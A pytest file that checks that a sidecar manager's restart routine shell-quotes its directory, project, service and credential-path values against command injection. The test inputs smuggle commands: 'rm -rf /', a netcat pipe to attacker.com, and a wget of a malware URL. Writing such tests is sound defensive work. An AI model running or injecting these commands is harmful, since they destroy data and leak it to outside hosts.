import pytest
import asyncio
from unittest.mock import patch, MagicMock
from rotator_library.providers.utilities.a2a_sidecar_manager import A2ASidecarManager

@pytest.mark.asyncio
async def test_restart_sidecar_command_injection_prevention():
    manager = A2ASidecarManager(backend="sidecar")
    # Simulate malicious inputs
    manager._compose_dir = "/opt/env; rm -rf /"
    manager._compose_project = "project & echo 'hacked'"
    manager._compose_service = "service | nc attacker.com 1337"

    malicious_cred_path = "/path/to/cred; wget http://malware"

    with patch('asyncio.create_subprocess_shell') as mock_subprocess:
        mock_proc = MagicMock()
        mock_subprocess.return_value = mock_proc

        # Use Future to simulate async wait
        future = asyncio.Future()
        future.set_result((b'stdout', b'stderr'))
        mock_proc.communicate.return_value = future
        mock_proc.returncode = 0

        await manager._restart_sidecar(malicious_cred_path)

        mock_subprocess.assert_called_once()
        cmd_arg = mock_subprocess.call_args[0][0]

        assert "'/opt/env; rm -rf /'" in cmd_arg or '"/opt/env; rm -rf /"' in cmd_arg

        # Verify it is single quoted properly (or double quoted)
        assert "; rm -rf" not in cmd_arg.replace("'/opt/env; rm -rf /'", "").replace('"/opt/env; rm -rf /"', "")
